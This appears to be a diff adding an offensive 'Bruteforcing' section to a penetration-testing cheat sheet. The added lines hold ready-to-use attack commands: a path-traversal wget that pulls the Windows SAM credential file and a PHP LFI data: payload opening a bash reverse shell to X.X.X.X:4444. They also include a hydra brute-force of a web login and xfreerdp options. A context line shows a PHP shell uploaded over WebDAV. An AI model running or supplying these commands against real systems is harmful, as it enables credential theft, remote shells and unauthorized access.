@@ -99,3 +99,27 @@ pdftotext *.pdf
 cadaver http://192.168.1.103/dav/
  put /tmp/shell.php
 ```
+
+### Bruteforcing 
+Want to exfiltrate binary data embedded in HTML tags?
+```
+ wget -qO- 'http://X.X.X.X/vulnpage?vulparam=..\..\..\..\..\..\..\..\..\..\..%5cWINDOWS%5cRepair%5cSAM%00en' |perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' > SAM
+```
+2. PHP LFI, but no file (php, phar) gets executed?
+```
+data:text/plain,<?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
+```
+4. Trying to get a password on a web interface?
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt X.X.X.X http-post-form "/URL/Login:User=^USER&password=^PASS:F=<String indicating attempt has failed>" -I
+```
+
+5. transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]
+
+```
+xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:rdp
+# OR, if having a different connect error, also try:
+xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:tls
+# and if you want to have files and clipboard there:
+xfreerdp +clipboard /u:user /p:'password' /v:X.X.X.X /d:domain /sec:<whatever> /drive:<absolute path to your local folder>,/
+```
